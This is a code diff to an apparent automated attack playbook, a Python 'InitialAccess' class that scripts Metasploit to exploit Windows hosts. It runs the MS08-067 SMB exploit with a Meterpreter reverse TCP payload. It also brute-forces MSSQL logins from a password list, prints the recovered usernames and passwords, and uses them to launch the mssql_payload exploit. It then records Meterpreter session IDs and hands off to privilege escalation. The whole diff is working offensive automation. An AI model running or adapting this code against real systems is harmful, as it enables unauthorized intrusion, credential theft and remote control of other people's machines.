@@ -22,7 +22,8 @@ class InitialAccess(object):
         """
         Create a reverse shell with target
         """
-        config.MSFCONSOLE.set_shell(False)
+        target = config.TARGETS[target_name]
+        # setup exploit
         cmd = "use exploit/windows/smb/ms08_067_netapi"
         msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
         cmd = "set PAYLOAD windows/meterpreter/reverse_tcp"
@@ -35,21 +36,27 @@ class InitialAccess(object):
         msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
         cmd = "set LPORT " + config.MSF_LPORT
         msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
+        # run exploit
+        config.MSFCONSOLE.set_active_session()
         cmd = "exploit"
-        config.MSFCONSOLE.set_shell()
-        config.MSFCONSOLE.callback(cmd, verbose=False)
-        # cmd = "sessions -i 1"
-        # config.MSFCONSOLE.callback(cmd, verbose=False)
-        # update user privs
+        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True, wait=5)
+        # handle result
+        for line in msf_reply.splitlines():
+            if 'Meterpreter session' in line:
+                words = line.split()
+                target.session_id = words[3]
+                config.MSFCONSOLE.background_session(target_name)
+                print("[*] exploit successful, session id:", words[3])
+                break
+        # update user priviledges
         config.PRIVILEDGEESC.update_priviledes(target_name)
-        print("[*] access to " + target_name + " successfull")
 
     def exploit_msql_brute_force(self, target_name, verbose = False):
         """
         Create a reverse shell with target
         """
-        config.MSFCONSOLE.set_shell(False)
         target = config.TARGETS[target_name]
+        # setup exploit (part 1)
         cmd = "use auxiliary/scanner/mssql/mssql_login"
         msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
         pass_path = Path.cwd().glob("playbook/passwords.txt").__next__()
@@ -61,9 +68,11 @@ class InitialAccess(object):
         msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
         cmd = "set VERBOSE " + str(verbose).lower()
         msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
-        print()
+        # run exploit (part 1)
         cmd = "exploit"
-        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=False, timeout=120)
+        msf_reply = config.MSFCONSOLE.callback(cmd, verbose=False, wait=10)
+        print(msf_reply)
+        # handle result
         for line in msf_reply.splitlines():
             if "Login Successful" in line:
                 index = msf_reply.rfind("Login Successful: ")
@@ -75,6 +84,7 @@ class InitialAccess(object):
                 print('   ', 'username:', target.msql_username)
                 print('   ', 'password:', target.msql_password, '\n')
                 break
+        # setup exploit (part 2)
         if target.msql_password:
             cmd = "use exploit/windows/mssql/mssql_payload"
             msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
@@ -90,12 +100,19 @@ class InitialAccess(object):
             msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
             cmd = "set PASSWORD " + target.msql_password
             msf_reply = config.MSFCONSOLE.callback(cmd, verbose=True)
-            config.MSFCONSOLE.set_shell()
+            # run exploit (part 2)
+            config.MSFCONSOLE.set_active_session()
             cmd = "exploit"
-            msf_reply = config.MSFCONSOLE.callback(cmd, verbose=False, wait=14)
-            # update user privs
+            msf_reply = config.MSFCONSOLE.callback(cmd, verbose=False, wait=22)
+            # handle result
+            for line in msf_reply.splitlines():
+                if 'Meterpreter session' in line:
+                    words = line.split()
+                    target.session_id = words[3]
+                    config.MSFCONSOLE.background_session(target_name)
+                    print("[*] exploit successful, session id:", words[3])
+                    break
+            # update user priviledges
             config.PRIVILEDGEESC.update_priviledes(target_name)
-            print()
-            print("[*] access to " + target_name + " successfull")
         else:
-            print("[*] access to " + target_name + "failed")
+            print("[!] exploit failed, password not found")
